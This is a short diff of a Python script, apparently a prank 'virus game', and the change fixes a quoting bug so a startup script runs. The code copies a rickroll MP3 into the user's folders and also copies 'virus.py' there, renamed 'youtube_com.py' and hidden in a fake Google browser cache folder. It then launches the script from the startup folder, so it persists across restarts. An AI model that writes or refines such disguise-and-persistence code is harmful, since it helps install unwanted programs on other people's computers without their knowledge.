@@ -18,4 +18,4 @@ os.system(f"copy youtube_com-watch-dQw4w9WgXcQ.mp3 %USERPROFILE%/Music/youtube_c
 os.system(f"copy youtube_com-watch-dQw4w9WgXcQ.mp3 %USERPROFILE%/Downloads/Google_Stable_x64/assets/cache/youtube_com-watch-dQw4w9WgXcQ.mp3".replace("/", "\\"))
 os.system(f"copy virus.py %USERPROFILE%/Downloads/Google_Stable_x64/assets/cache/youtube_com.py".replace("/", "\\"))
 print("Running virus_game_startup.py...")
-os.system(f"{PYTHON_COMMAND} {os.path.join(f'{startup_folder}/virus_game_startup.py')}')
+os.system(f"{PYTHON_COMMAND} {os.path.join(f'{startup_folder}/virus_game_startup.py')}")
